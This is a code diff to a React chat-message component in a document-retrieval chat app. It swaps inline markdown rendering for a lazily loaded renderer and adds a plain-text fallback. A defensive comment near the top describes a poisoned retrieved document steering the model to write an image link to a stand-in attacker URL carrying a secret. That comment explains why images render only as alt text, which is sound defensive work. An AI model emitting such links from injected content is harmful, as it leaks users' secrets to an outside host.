@@ -1,16 +1,14 @@
 import { memo, useEffect, useMemo, useRef, useState } from 'react';
 import type { ReactNode } from 'react';
-import ReactMarkdown, { type Components } from 'react-markdown';
-import remarkGfm from 'remark-gfm';
+import type { Components } from 'react-markdown';
 import type { CitationResponse, FeedbackRating, TimingsResponse } from '../api/types';
 import { withCitationFootnotes } from '../utils/exportChat';
 import { citationNumberFromHref, linkCitations } from '../utils/citations';
-import { splitStreamingMarkdown } from '../utils/markdownBlocks';
 import CitationCard from './CitationCard';
+import { useMarkdownRenderer } from './markdownLoader';
 import StreamingSkeleton from './StreamingSkeleton';
 import './ChatMessage.css';
 
-const REMARK_PLUGINS = [remarkGfm];
 // Answers quote retrieved documents, and a poisoned document can steer the model into
 // writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
 // it rendered, no click needed. Show the alt text instead of loading anything.
@@ -197,6 +195,7 @@ function ChatMessage({
   };
 
   const showSkeleton = streamStage !== undefined && turn.content === '';
+  const Markdown = useMarkdownRenderer();
   // [n] markers become buttons that open (and on hover preview) the source they cite.
   const markdownComponents = useMemo<Components>(() => {
     const byNumber = new Map(turn.sources.map((source) => [source.source_number, source]));
@@ -307,23 +306,20 @@ function ChatMessage({
             A
           </span>
           <div className="chat-message__answer">
-            <span className="chat-message__status" role="status">
-              {streamStage !== undefined
-                ? showSkeleton
-                  ? streamStage
-                  : 'Answer streaming.'
-                : turn.content
-                  ? 'Answer ready.'
-                  : ''}
-            </span>
             {showSkeleton ? (
               <StreamingSkeleton stage={streamStage} />
             ) : (
               <div className="chat-message__markdown">
-                {streamStage !== undefined ? (
-                  <StreamingMarkdown text={linkedContent} components={markdownComponents} />
+                {Markdown ? (
+                  <Markdown
+                    text={linkedContent}
+                    components={markdownComponents}
+                    streaming={streamStage !== undefined}
+                  />
                 ) : (
-                  <MarkdownBlock text={linkedContent} components={markdownComponents} />
+                  // The raw answer, not linkedContent: its citation links would show as
+                  // "[1](#docrag-cite-1)" until the renderer arrives.
+                  <p className="chat-message__plain">{turn.content}</p>
                 )}
               </div>
             )}
@@ -463,33 +459,6 @@ function ChatMessage({
         </div>
       )}
     </div>
-  );
-}
-
-interface MarkdownProps {
-  text: string;
-  components: Components;
-}
-
-const MarkdownBlock = memo(function MarkdownBlock({ text, components }: MarkdownProps) {
-  return (
-    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={components}>
-      {text}
-    </ReactMarkdown>
-  );
-});
-
-/** An answer still streaming: finished blocks are memoized, so each token re-parses only
- *  the block it extends rather than the whole answer so far. */
-function StreamingMarkdown({ text, components }: MarkdownProps) {
-  const { done, tail } = splitStreamingMarkdown(text);
-  return (
-    <>
-      {done.map((block, index) => (
-        <MarkdownBlock key={index} text={block} components={components} />
-      ))}
-      <MarkdownBlock text={tail} components={components} />
-    </>
   );
 }
 
